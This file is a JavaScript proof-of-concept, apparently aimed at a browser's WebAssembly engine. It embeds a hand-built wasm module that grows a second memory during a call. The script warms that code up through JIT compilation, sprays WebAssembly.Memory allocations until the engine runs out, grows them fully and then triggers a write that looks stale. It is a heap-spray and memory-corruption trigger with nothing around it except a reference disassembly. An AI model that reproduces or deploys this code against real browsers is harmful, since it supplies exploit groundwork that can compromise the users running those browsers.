// Wat for Reference:
// (module
//   (memory $memory0 65536 65536)
//   (memory $memory1 1 65536)
//   (func $main (;0;) (export "main") (param $var0 i32) (param $var1 i32) (param $var2 i32) (result i32)
//     i32.const 0
//     i32.const 15
//     i32.store align=1  ;; memory_index=1
//     call $grow
//     i32.const 0
//     i32.const 15
//     i32.store align=1  ;; memory_index=1
//     i32.const 0
//   )
//   (func $grow (;1;)
//     i32.const 65535
//     memory.grow 1
//     drop
//   )
// )
let wasm_bytecode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 11, 2, 96, 3, 127, 127, 127, 1, 127, 96, 0, 0, 3, 3, 2, 0, 1, 5, 13, 2, 1, 128, 128, 4, 128, 128, 4, 1, 1, 128, 128, 4, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 34, 2, 22, 0, 65, 0, 65, 15, 54, 64, 1, 0, 16, 1, 65, 0, 65, 15, 54, 64, 1, 0, 65, 0, 11, 9, 0, 65, 255, 255, 3, 64, 1, 26, 11, 0, 20, 4, 110, 97, 109, 101, 1, 13, 2, 0, 4, 109, 97, 105, 110, 1, 4, 103, 114, 111, 119]);

function make_instance(wasm_module) {
  return new WebAssembly.Instance(wasm_module);
}

function make_module(wasm_bytecode) {
  let wasm_module = new WebAssembly.Module(wasm_bytecode);
  let wasm_instance = make_instance(wasm_module);

  for (let i = 0; i < 300000; i++) {
    wasm_instance.exports.main();
  }

  return wasm_module;
}

function make_memory(min_pages, max_pages) {
  return new WebAssembly.Memory({
    initial: min_pages,
    maximum: max_pages
  });
}

function make_pre_spraied_memories() {
  let pre_spraied_memories = [];

  for (let i = 0; i < 3; i++) {
    pre_spraied_memories.push(make_memory(65536, 65536));
  } // console.log("finish make_pre_spraied_memories, total amount: " + pre_spraied_memories.length);


  return pre_spraied_memories;
}

function clear_pre_spraied_memories(pre_spraied_memories) {
  // console.log("clear_pre_spraied_memories, amount: " + pre_spraied_memories.length);
  while (pre_spraied_memories.length > 0) {
    pre_spraied_memories.pop();
  }
}

function make_spraied_memories() {
  let spraied_memories = [];

  while (true) {
    try {
      spraied_memories.push(make_memory(1, 65536)); // console.log("make_spraied_memories, amount: " + spraied_memories.length);
    } catch (e) {
      break; // RangeError: WebAssembly.Memory(): could not allocate memory
    }
  } // console.log("finish make_spraied_memories, total amount: " + spraied_memories.length);


  return spraied_memories;
}

function clear_spraied_memories(spraied_memories) {
  // console.log("clear_spraied_memories, amount: " + spraied_memories.length);
  while (spraied_memories.length > 0) {
    spraied_memories.pop();
  }
}

function spraied_memory_grow_full(spraied_memories, index) {
  // console.log("spraied_memory_grow_full, index: " + index);
  spraied_memories[index].grow(65536 - 1);
}

let pre_spraied_memories = make_pre_spraied_memories();
let wasm_module = make_module(wasm_bytecode);
let wasm_instance = make_instance(wasm_module);
let spraied_memories = make_spraied_memories();

for (let i = 0; i < spraied_memories.length; i++) {
  try {
    spraied_memory_grow_full(spraied_memories, i);
    console.log("grow_success, index: " + i);
  } catch (e) {
    console.log("grow_fail, index: " + i);
    clear_pre_spraied_memories(pre_spraied_memories);
    break; // RangeError: WebAssembly.Memory.grow(): Unable to grow instance memory
  }
}

wasm_instance.exports.main();